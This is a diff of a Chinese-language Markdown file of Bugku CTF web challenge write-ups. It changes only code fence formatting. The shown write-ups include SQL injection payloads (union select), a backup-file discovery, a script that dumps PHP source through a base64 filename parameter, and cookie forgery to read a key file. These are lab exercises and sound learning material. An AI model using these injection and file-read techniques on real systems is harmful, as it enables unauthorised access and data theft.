@@ -243,6 +243,7 @@ url=http://123.206.87.240:8002/baopo/ hint：爆破
 ## 备份是个好习惯
 打开网址 得hex代码 转换成ASCII失败 应该不是hex
 hint：备份
+
 - 用py扫一下目录得到 http://123.206.87.240:8002/web16/index.php.bak
 - 下载打开
 
@@ -282,6 +283,7 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
 
 ## 成绩单查询
 标准sql注入题
+
 - hackbar注入`id=1'#` 成功
 - 判断列数`id=1' order by 4#`四列，五列测试不对
 - 联合查询`id=0' union select 1,2,3,4#`z成功
@@ -298,8 +300,10 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
 题目：亲请在2s内计算老司机的车速是多少
 1453188555*112050552*2035911046+129564843-990655641*10801555*1826101406-742934982+1688885834-387627083+502307721=?;
 车速太快人不行了 借助py
+
 - 看看前辈 https://www.jianshu.com/p/b0a5d72c8bae
-  ```python
+
+```python
   #改一下url
   import requests
   import re
@@ -310,7 +314,7 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
   result = eval(expression)
   post = {'value': result}
   print(s.post(url, data = post).text)  
-  ```
+```
 - 跑了好几次
 - Bugku{YOU_DID_IT_BY_SECOND}
 
@@ -320,7 +324,8 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
 - 抓包看一下raw中有base64 解码后验证不是flag
 - 每一次go base64都不一样
 - 写脚本
-  ```python
+
+```python
   #coding:utf-8
   import requests
   import base64
@@ -334,7 +339,8 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
   data={'margin':flag}
 
   print(s.post(url=url,data=data).content.decode())
-  ```
+```
+
 - KEY{111dd62fcd377076be18a}
 
 ## cookies欺骗
@@ -343,16 +349,18 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
 - 尝试用filename访问index.php（原url使用base64，这也将index.php进行编码`aW5kZXgucGhw`
 - 构造 http://123.206.87.240:8002/web11/index.php?line=1&filename=aW5kZXgucGhw
 - 显示信息切换行数都有 写脚本获取全部代码
-  ```python 
+
+```python 
   import requests
   a=30
   for i in range(a):
       url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw" 
       s=requests.get(url)
       print s.text
-  ```
+```
+
 得到源代码
-  ```php
+```php
   <?php
   error_reporting(0);
   $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
@@ -370,7 +378,8 @@ if(md5($key1) == md5($key2) && $key1 !== $key2){
   echo $fa[$line];
   }
   ?>
-  ```
+```
+
 - 阅读得知cookie margin=margin
 - 抓包raw加上Cookie: margin=margin 修改filename=a2V5cy5waHA=  然后go
 - KEY{key_keys}
